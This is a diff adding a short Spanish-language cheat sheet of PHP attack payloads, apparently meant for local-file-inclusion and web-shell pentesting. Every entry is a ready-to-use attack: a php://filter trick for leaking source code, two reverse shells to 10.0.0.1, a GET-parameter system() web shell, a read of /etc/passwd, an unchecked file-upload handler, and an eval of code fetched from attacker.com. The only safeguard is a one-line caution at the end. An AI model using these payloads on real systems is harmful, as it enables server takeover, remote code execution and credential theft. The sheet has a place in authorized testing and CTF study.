@@ -1,0 +1,36 @@
+▶ Ver Código en Base64 (Leer archivo codificado):
+  php://filter/convert.base64-encode/resource=contacto.php
+
+▶ Decodificar Base64 (Convertir a texto legible):
+  echo -n '<CÓDIGO_BASE64>' | base64 -d
+
+▶ Reverse Shell en una línea (Conexión remota):
+  php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+▶ Ejecutar Comando (Ejecución vía GET):
+  <?php system($_GET['cmd']); ?>
+
+▶ Leer Archivo (Obtener contenido):
+  <?php echo file_get_contents('/etc/passwd'); ?>
+
+▶ Listar Directorio (Mostrar archivos):
+  <?php print_r(scandir('.')); ?>
+
+▶ Subir Archivo (Carga de ficheros):
+  <?php
+  if (isset($_FILES['file'])) {
+    move_uploaded_file($_FILES['file']['tmp_name'], '/ruta/destino/' . $_FILES['file']['name']);
+    echo "Archivo subido con éxito";
+  }
+  ?>
+
+▶ Ejecutar Código PHP Remoto (Incluir script externo):
+  <?php eval(file_get_contents('http://attacker.com/malicious.txt')); ?>
+
+▶ Generar Shell Interactiva (Terminal persistente):
+  <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"); ?>
+
+# Ejemplo de uso:
+# http://vulnerable.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
+# Este comando intenta leer el contenido del archivo config.php en formato base64.
+# NOTA DE PRECAUCIÓN: Estas técnicas pueden ser peligrosas si se usan en sistemas en producción. Úsalas solo en entornos controlados y con permiso explícito.
